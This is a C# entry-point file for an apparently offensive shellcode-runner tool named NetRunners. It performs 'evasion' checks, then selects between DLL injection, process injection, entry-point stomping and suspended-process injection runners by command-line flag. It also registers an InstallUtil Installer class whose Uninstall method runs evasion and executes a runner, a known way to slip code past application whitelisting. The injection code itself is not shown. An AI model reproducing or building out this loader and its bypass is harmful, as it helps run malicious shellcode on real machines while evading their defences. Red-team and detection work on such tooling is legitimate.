using System;
using NetRunners.Interfaces;
using NetRunners.Runners;

namespace NetRunners.Exe
{
    class Program
    {
        /// <summary>
        /// Entry point for this program, calls Evasion functions, and then determines which runner to call.
        /// Accepts one or no arguments at runtime. By default (no args specified), calls default Shellcode Runner.
        /// </summary>
        /// <param name="-cdi">
        /// Calls classic Dll injection Runner
        /// </param>
        /// <param name="-cpi">
        /// Calls Classic Process injection Runner
        /// </param>
        /// <param name="-epi">
        /// Calls EntryPoint Stomping Process Injection Runner
        /// </param>
        /// <param name="-pi">
        /// Calls Process Injection Runner
        /// </param>
        /// <param name="-spi">
        /// Calls Suspended Process Injection Runner
        /// </param>
        static void Main(string[] args)
        {
            NetRunners.Helpers.Helper.PrintBanner();

            // evasion
            NetRunners.Helpers.Helper.PerformChecks();
            // execute runner
            IRunner runner = DetermineRunner(args);
            runner?.Run();
        }
        // Determine the function call based on the argument provided, case insensitive
        static IRunner DetermineRunner(string[] args)
        {
            string call = args.Length == 1 ? args[0].ToLower() : string.Empty;
            switch (call)
            {
                case "-cdi":
                    return new ClassicDllInjectionRunner();
                case "-cpi":
                    return new ClassicProcessInjectionRunner();
                case "-epi":
                    return new EntryPointStompingProcessInjectionRunner();
                case "-pi":
                    return new ProcessInjectionRunner();
                case "-spi":
                    return new SuspendedProcessInjectionRunner();       
                default:
                    return new DefaultRunner();
            }
        }
    }
    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();
            // execution
            NetRunners.Helpers.Helper.SelectRunner();
        }
    }
}
